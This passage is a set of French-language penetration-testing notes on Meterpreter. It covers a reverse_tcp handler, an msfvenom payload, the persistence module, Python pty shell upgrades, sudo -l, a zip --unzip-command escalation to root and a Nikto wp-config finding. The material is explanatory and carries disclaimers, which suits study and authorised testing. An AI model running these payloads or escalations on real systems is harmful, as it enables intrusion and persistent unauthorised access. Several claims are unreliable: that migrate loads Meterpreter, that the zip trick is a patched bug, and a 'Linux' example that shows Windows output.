## Retour vers Meterpreter

| Tags |
|------|
| `Meterpreter` `Reverse shell` `Payload` |

Il existe plusieurs façons de retourner dans une session Meterpreter. Cette section en décrit quelques-unes.

### Utilisation d'une session existante

Si vous avez déjà une session Meterpreter active, vous pouvez simplement utiliser la commande `sessions -i [ID]`, où `[ID]` est l'ID de la session que vous souhaitez cibler. Vous pouvez lister les sessions actives avec `sessions -l`.

### Utilisation d'un reverse shell

Si vous avez une session de shell standard, vous pouvez charger Meterpreter en utilisant la commande `migrate`.  Cela peut être fait en premier lieu en exécutant le payload Meterpreter sur la machine cible. Voici comment faire cela:

1.  Configurez et lancez un handler multi/handler dans Metasploit pour recevoir la connexion inverse.  Configurez le handler pour qu'il corresponde au payload que vous allez utiliser sur la machine cible.  Par exemple:

    ```bash
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    set lhost [IP]
    set lport [PORT]
    run
    ```

2.  Sur la machine cible, exécutez le payload.  Cela peut être fait de différentes manières, selon la vulnérabilité que vous exploitez.  Par exemple, si vous utilisez une vulnérabilité de buffer overflow, vous devrez inclure le payload dans l'entrée qui cause le débordement.  Un exemple de payload qui peut être utilisé est le suivant:

    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f exe -o shell.exe
    ```

3.  Une fois le payload exécuté, vous devriez avoir une session Meterpreter active.

### Utilisation d'un persistence module

Vous pouvez utiliser un module de persistance pour vous assurer que vous avez toujours accès à une session Meterpreter, même après un redémarrage de la machine cible.  Un exemple de module de persistance est le module `persistence` dans Metasploit.  Pour l'utiliser, vous devez d'abord avoir une session Meterpreter active.  Ensuite, vous pouvez exécuter le module avec la commande suivante:

```bash
run persistence -h
```

Cela affichera l'aide du module, qui expliquera les différentes options disponibles.  Vous pouvez utiliser les options pour configurer le module de persistance pour qu'il s'exécute à différents moments, comme au démarrage du système, et pour utiliser différentes méthodes de persistance, comme l'ajout d'une clé de registre ou la création d'un service.

**Avertissement :** l'utilisation de ces techniques peut être illégale si elle n'est pas autorisée.  Assurez-vous d'avoir l'autorisation appropriée avant d'utiliser ces techniques.  L'auteur n'est pas responsable de toute utilisation abusive de ces informations.  Ces informations sont uniquement à des fins éducatives.

Pour plus d'informations, veuillez consulter les ressources suivantes :

*   [Site Web Metasploit]([URL])
*   [Documentation Metasploit]([URL])
*   [Guide du pentester]([URL])


## Retour à Meterpreter après une commande shell

| Tags |
|------|
| `Meterpreter` `Shell` `Sécurité` `Ethique` |

Pour retourner à Meterpreter après l'exécution d'une commande shell dans une session Meterpreter, utilisez la commande <code>shell</code> pour entrer en mode shell, puis <code>exit</code> pour revenir à Meterpreter. Exemple :

```bash
meterpreter > shell
Process 8564 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> exit
meterpreter > 
```

La commande <code>shell</code> active un shell natif sur le système cible, tandis que <code>exit</code> ferme ce shell et vous ramène à l'interface Meterpreter.

Rappel : l'utilisation de Meterpreter et d'outils similaires pour accéder à un système sans autorisation est illégale et contraire à l'éthique. Assurez-vous d'avoir le droit d'accéder au système cible.


## Sysinfo sous Linux (Metasploit/Meterpreter)

| Tags |
|------|
| `sysinfo` `Metasploit` `Meterpreter` `Linux` `Windows` |

La commande `sysinfo` n'est pas native à Linux.  Dans l'environnement Metasploit et Meterpreter, elle est employée pour collecter des informations système basiques sur la machine cible.

Exemple d'utilisation :

```
meterpreter > sysinfo
Computer        : TARGET
OS              : Windows NT TARGET 6.1 (Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_GB
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```

La sortie de `sysinfo` inclut le nom de l'ordinateur, le système d'exploitation, l'architecture, la langue système, le domaine et le nombre d'utilisateurs connectés.

Pour obtenir des informations système sous Linux, d'autres commandes sont à privilégier : `uname -a` (informations sur le noyau et l'architecture), `lsb_release -a` (informations sur la distribution), `free -m` (informations sur l'utilisation de la mémoire).


## Affichage de l'ID utilisateur avec getuid

| Tags |
|------|
| `Metasploit` `Meterpreter` `getuid` `Sécurité` `Linux` |

Dans Metasploit et Meterpreter, la commande `getuid` affiche l'identifiant de l'utilisateur du processus Meterpreter sur le système cible.

Exemple d'utilisation :

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Dans cet exemple, `getuid` affiche `NT AUTHORITY\SYSTEM`, indiquant l'exécution de Meterpreter avec les privilèges système sur la machine cible.

En dehors de Metasploit, sous Linux, les commandes `id` ou `whoami` fournissent des informations similaires. Exemples :

```bash
$ id
uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)

$ whoami
user
```

Ces commandes retournent respectivement des informations détaillées sur l'utilisateur et son nom.


## Explication de la commande `shell` dans Meterpreter

| Tags |
|------|
| `Meterpreter` `Shell` `Bash` `pty` `Python` |

La commande `shell` dans Meterpreter permet d'interagir avec le système cible à travers un shell. L'exemple fourni illustre l'utilisation de cette commande pour obtenir un accès shell interactif.

1.  **`meterpreter > shell`** : Cette commande lance une session shell sur le système compromis.

2.  **`Process 1256 created.`** : Indique la création d'un nouveau processus, avec l'ID 1256 dans cet exemple.  Ce processus est le shell.

3.  **`Channel 1 created.`** : Crée un canal de communication (canal 1 dans l'exemple) pour l'interaction avec le shell.

4.  **`python -c 'import pty; pty.spawn("/bin/bash")'`** : Exécute une commande Python qui :

    *   importe le module `pty` (pseudo-terminal).
    *   utilise `pty.spawn()` pour lancer une instance de `/bin/bash` dans un pseudo-terminal.  Ceci permet une interaction interactive avec le shell, simulant l'expérience d'un terminal.

En résumé, cette séquence de commandes crée un shell interactif `bash` sur le système cible, permettant à l'utilisateur de Meterpreter d'exécuter des commandes comme s'il était directement connecté au système.


## Améliorer l'interactivité du shell avec Python

| Tags |
|------|
| `Meterpreter` `Shell` `Python` `pty` `bash` |

Lorsque la commande <code>shell</code> est exécutée dans une session Meterpreter, elle fournit une interface shell standard limitée sur la machine cible.

La commande <code>python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</code> est une méthode pour améliorer ce shell limité en un shell interactif complet. Cette commande exécute le code Python suivant :

*   <code>python -c</code> : Exécute le code Python suivant en tant que script.
*   <code>&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</code> : Ce script importe le module <code>pty</code> et utilise <code>pty.spawn</code> pour lancer un nouveau shell Bash.

Le module <code>pty</code> permet la création et le contrôle de pseudo-terminaux, qui émulent l'interface d'un terminal physique. <code>pty.spawn</code> crée un nouveau processus pseudo-terminal et exécute le shell Bash spécifié, offrant un environnement shell interactif plus complet que celui fourni initialement par la commande <code>shell</code> dans Meterpreter.

Cette technique est utile pour l'exécution de commandes nécessitant une interface interactive, ou pour améliorer l'environnement shell sur la machine cible.


## Comprendre la commande sudo -l

| Tags |
|------|
| `sudo` `Linux` `sécurité` `permissions` |

La commande <code>sudo -l</code> permet d'afficher les privilèges sudo d'un utilisateur sur le système. Elle liste les commandes qu'un utilisateur peut exécuter avec les privilèges du superutilisateur (root) ou d'autres utilisateurs, selon la configuration du fichier <code>sudoers</code>.

Exemple de sortie de la commande <code>sudo -l</code> :

```bash
$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User [NOM] may run the following commands on this host:
    (ALL : ALL) ALL
```

Dans cet exemple, l'utilisateur [NOM] a la permission d'exécuter n'importe quelle commande en tant que n'importe quel utilisateur (<code>ALL : ALL</code>) sur le système.

Si l'utilisateur n'a pas de permissions sudo, ou si l'exécution de <code>sudo -l</code> nécessite le mot de passe sudo sans être connecté en tant que superutilisateur, la sortie pourrait ressembler à ceci :

```bash
$ sudo -l
[sudo] password for [NOM]:
Sorry, [NOM] may not run sudo on localhost
```

L'utilisation de <code>sudo</code> confère des privilèges élevés et doit être maniée avec prudence pour éviter des actions potentiellement dommageables pour le système.


## Analyse de la commande `zip` et de Nikto

| Tags |
|------|
| `zip` `sudo` `shell` `WordPress` `sécurité` `Nikto` |

La commande suivante tente d'exploiter une vulnérabilité potentielle de la commande `zip` :

```bash
sudo -u root zip /tmp/exploit.zip /tmp/exploit -T --unzip-command="sh -c /bin/bash"
```

Cette commande est une tentative d'exécution d'un shell avec les privilèges `root`. Décomposons-la :

*   `sudo -u root` : Exécute la commande suivante en tant que l'utilisateur `root`.
*   `zip /tmp/exploit.zip /tmp/exploit` : Crée une archive ZIP nommée `exploit.zip` contenant le contenu de `/tmp/exploit`.
*   `-T` : Active le mode test, qui vérifie l'intégrité de l'archive.
*   `--unzip-command="sh -c /bin/bash"` : Définit la commande à exécuter lors de la décompression pendant le test. Dans ce cas, il s'agit d'un shell bash.

L'objectif est d'utiliser la commande `zip` avec l'option `-T` pour exécuter un shell bash avec les privilèges `root`. Cette vulnérabilité a été corrigée dans de nombreuses versions modernes de `zip`.

## Analyse du rapport Nikto et des fichiers WordPress

Nikto est un outil de scan de sécurité web qui recherche les vulnérabilités. Le rapport mentionne :

```
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
```

Cela indique que Nikto a trouvé un fichier nommé `#wp-config.php#` sur le site web. Ce fichier est généralement un fichier temporaire créé par des éditeurs de texte et pourrait exposer des informations sensibles.

Il est important de noter que Nikto ne modifie pas les fichiers. Il signale simplement les fichiers trouvés.

## Absence du fichier `wp-config`

Si le fichier `#wp-config.php#` n'est pas visible directement, il peut s'agir d'un faux positif. Vérifiez manuellement l'existence du fichier via un navigateur : `http://[your_website]/#wp-config.php#`.

Si le fichier n'est pas accessible, il est probable qu'il s'agisse d'un faux positif.
